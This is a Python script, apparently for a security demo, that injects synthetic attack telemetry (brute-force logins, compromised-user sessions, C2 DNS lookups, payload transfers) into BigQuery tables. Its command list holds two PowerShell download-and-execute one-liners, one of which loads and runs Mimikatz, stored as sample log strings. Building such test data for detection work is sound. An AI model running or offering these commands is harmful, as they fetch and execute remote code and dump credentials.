# @title Cymbal Cyber - Single Malicious Event Injector

import time
import datetime
import random
import json
import logging
import ipaddress
import hashlib
from google.cloud import bigquery
import google.auth

# --- Core Configuration ---
try:
    credentials, project_id = google.auth.default()
    PROJECT_ID = project_id
    if not PROJECT_ID:
        raise Exception("PROJECT_ID is not set.")
    logging.info(f"Successfully authenticated. Project ID: {PROJECT_ID}")
except Exception as e:
    logging.warning(f"Could not auto-detect project ID. Using 'my-project'. Error: {e}")
    PROJECT_ID = "my-project" # Fallback

# --- Table IDs ---
ACCESS_TABLE_ID = f"{PROJECT_ID}.Cymbal_Cyber.user_access_events"
NETWORK_TABLE_ID = f"{PROJECT_ID}.Cymbal_Cyber.network_events"

# --- Event Counts ---
TOTAL_MALICIOUS_PAIRS = 50      # Successful, correlated breaches
TOTAL_BRUTE_FORCE_ATTEMPTS = 200 # Failed, uncorrelated login attempts
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Malicious User, Device & Event Persona Configuration ---
COMPROMISED_USERS = ['g.harris', 'u.lewis']
MALICIOUS_DEVICE = 'ws-hr-05'
BRUTE_FORCE_TARGET_USERS = ['g.harris', 'u.lewis']

# --- Added weights for the actions ---
MALICIOUS_ACTION_WEIGHTS = {
    'dns_query': 0.5,         # 50% chance of C2 beaconing
    'policy_violation': 0.3,  # 30% chance of malicious command
    'file_transfer': 0.2      # 20% chance of exfil/download
}
MALICIOUS_ACTION_TYPES = list(MALICIOUS_ACTION_WEIGHTS.keys())
MALICIOUS_ACTION_WEIGHT_VALUES = list(MALICIOUS_ACTION_WEIGHTS.values())

MALICIOUS_PUBLIC_IPS = [
    "175.45.176.10", # North Korea
    "175.45.177.32", # North Korea
    "175.45.178.110", # North Korea
    "194.26.135.68"  # Moscow, Russia
]

MALICIOUS_DOMAINS = ["xmr-pool.bad-domain.com", "my-payload-downloader.ru", "c2-server-1.xyz", "apt-group-data-exfil.org"]
SUSPICIOUS_USER_AGENTS = ["python-requests/2.28.1", "curl/7.81.0", "Go-http-client/1.1"]
RISKY_FILE_TYPES = ['exe', 'dll', 'ps1', 'bat', 'vbs']
MALICIOUS_COMMANDS = ["powershell -enc IEX(New-Object Net.WebClient).DownloadString('http://suspicious.com/payload.ps1')", "IEX (new-object net.webclient).downloadstring('http://198.51.100.55/mimikatz.ps1'); Invoke-Mimikatz"]
ELEVATED_PERMISSIONS = ['root', 'admin']


# --- Helper function to create access event ---
def create_base_access_event(user, public_ip, internal_ip, timestamp, event_type):
    """Creates a malicious login event (success or failure)."""
    return {
        "event_timestamp": timestamp.isoformat(),
        "event_type": event_type,
        "user_id": user,
        "source_ip": public_ip, # Attacker's *public* IP
        "assigned_internal_ip": internal_ip,
        "device_id": MALICIOUS_DEVICE,
        "device_os": "Windows 11",
        "user_agent": random.choice(SUSPICIOUS_USER_AGENTS),
        "application_name": "Corporate-VPN"
    }

# --- More flexible action event generator ---
def create_malicious_action_event(user, internal_ip, timestamp, action_type):
    """Creates a malicious network event (dns, file, or command)."""

    # Base event fields
    event = {
        "event_timestamp": timestamp.isoformat(),
        "event_type": action_type,
        "user_id": user,
        "source_ip": internal_ip,
        "source_port": random.randint(1024, 65535),
        "destination_ip": "10.100.1.1", # Default dest IP
        "destination_port": 443, # Default port
        "protocol": "TCP",
        "bytes_transferred": random.randint(128, 4096),
        "source_process_name": "powershell.exe",
        "network_domain": None,
        "file_name": None,
        "file_type": None,
        "command_line": None,
        "permission_level_requested": None,
        "file_hash_sha256": None
    }

    # Add specific metadata based on the action type
    if action_type == 'dns_query':
        event["network_domain"] = random.choice(MALICIOUS_DOMAINS)
        event["destination_ip"] = "10.100.1.1" # Internal DNS server
        event["destination_port"] = 53
        event["protocol"] = "UDP"
        event["bytes_transferred"] = random.randint(64, 256)

    elif action_type == 'policy_violation':
        event["command_line"] = random.choice(MALICIOUS_COMMANDS)
        event["permission_level_requested"] = random.choice(ELEVATED_PERMISSIONS)

    elif action_type == 'file_transfer':
        file_type = random.choice(RISKY_FILE_TYPES)
        event["file_name"] = f"payload.{file_type}"
        event["file_type"] = file_type
        event["file_hash_sha256"] = hashlib.sha256(str(random.random()).encode()).hexdigest()
        event["bytes_transferred"] = random.randint(500000, 2000000) # Larger transfer

    return event

# --- Main function to inject data into BigQuery ---
def inject_attack_scenario():
    """Generates and streams correlated PAIRS + uncorrelated FAILURES."""

    MALICIOUS_INTERNAL_IP_POOL = [f"10.50.{random.randint(0, 255)}.{random.randint(2, 254)}" for _ in range(TOTAL_MALICIOUS_PAIRS)]

    try:
        client = bigquery.Client(project=PROJECT_ID, credentials=credentials)
        client.get_table(ACCESS_TABLE_ID)
        client.get_table(NETWORK_TABLE_ID)
        logging.info(f"Successfully connected to BigQuery.")
    except Exception as e:
        logging.error(f"Failed to initialize BigQuery client or find tables: {e}", exc_info=True)
        logging.error("Please ensure table IDs are correct and you have 'BigQuery Data Editor' permissions.")
        return

    logging.info(f"--- 🚨 Starting Malicious Event Injector 🚨 ---")
    logging.info(f"Injecting {TOTAL_MALICIOUS_PAIRS} correlated attack pairs for users: {COMPROMISED_USERS}")
    logging.info(f"Action mix: {MALICIOUS_ACTION_WEIGHTS}")
    logging.info(f"Injecting {TOTAL_BRUTE_FORCE_ATTEMPTS} brute force login failures targeting: {BRUTE_FORCE_TARGET_USERS}")

    start_time = time.time()
    access_events_batch = []
    network_events_batch = []

    # --- 1. Generate Correlated Pairs (Successful Breach) ---
    for i in range(TOTAL_MALICIOUS_PAIRS):
        compromised_user = random.choice(COMPROMISED_USERS)
        attacker_public_ip = random.choice(MALICIOUS_PUBLIC_IPS)

        # Check if pool is empty (in case TOTAL_MALICIOUS_PAIRS is > pool size)
        if not MALICIOUS_INTERNAL_IP_POOL:
            logging.warning("Malicious IP pool is empty! Generating a fallback IP.")
            assigned_internal_ip = f"10.50.{random.randint(0, 255)}.{random.randint(2, 254)}"
        else:
            assigned_internal_ip = MALICIOUS_INTERNAL_IP_POOL.pop()

        login_time = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=random.randint(1,5))
        action_time = login_time + datetime.timedelta(seconds=random.randint(5, 60))

        # --- Event 1: The Malicious Login Success ---
        login_event = create_base_access_event(
            compromised_user, attacker_public_ip, assigned_internal_ip, login_time, "login_success"
        )

        # --- Event 2: The Malicious Action (DNS, Command, or File) ---
        action_type = random.choices(MALICIOUS_ACTION_TYPES, weights=MALICIOUS_ACTION_WEIGHT_VALUES, k=1)[0]
        action_event = create_malicious_action_event(
            compromised_user, assigned_internal_ip, action_time, action_type
        )

        access_events_batch.append(login_event)
        network_events_batch.append(action_event)

        time.sleep(0.05) # Slow down the correlated pairs

    # --- 2. Generate Uncorrelated Brute Force Failures ---
    logging.info(f"Generating {TOTAL_BRUTE_FORCE_ATTEMPTS} brute force events...")
    for i in range(TOTAL_BRUTE_FORCE_ATTEMPTS):
        attacker_public_ip = random.choice(MALICIOUS_PUBLIC_IPS)
        target_user = random.choice(BRUTE_FORCE_TARGET_USERS)
        event_time = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(seconds=random.randint(1,300))

        # --- Event 3: The Malicious Login Failure ---
        failure_event = create_base_access_event(
            target_user, attacker_public_ip, None, event_time, "login_failure"
        )
        access_events_batch.append(failure_event)
        time.sleep(0.01) # Faster burst for failures


    # --- 3. Insert all batches into BigQuery ---
    all_errors = []
    if access_events_batch:
        logging.info(f"Injecting {len(access_events_batch)} total access events (success + failure)...")
        errors = client.insert_rows_json(ACCESS_TABLE_ID, access_events_batch)
        if errors:
            all_errors.extend(errors)

    if network_events_batch:
        logging.info(f"Injecting {len(network_events_batch)} malicious network actions...")
        errors = client.insert_rows_json(NETWORK_TABLE_ID, network_events_batch)
        if errors:
            all_errors.extend(errors)

    elapsed_time = time.time() - start_time

    # --- 4. Report results ---
    if all_errors:
        logging.error(f"Encountered {len(all_errors)} errors during injection: {all_errors[:5]}")
    else:
        logging.info("✅ All malicious events injected successfully.")

    total_inserted = len(access_events_batch) + len(network_events_batch) - len(all_errors)
    logging.info("--------------------")
    logging.info(f"✅ Attack scenario injection complete.")
    logging.info(f"Successfully injected {total_inserted} malicious events in {elapsed_time:.2f} seconds.")
    logging.info(f"Total events in 'user_access_events': {len(access_events_batch)} ({TOTAL_MALICIOUS_PAIRS} success, {TOTAL_BRUTE_FORCE_ATTEMPTS} failure)")
    logging.info(f"Total events in 'network_events': {len(network_events_batch)}")


if __name__ == "__main__":
    inject_attack_scenario()
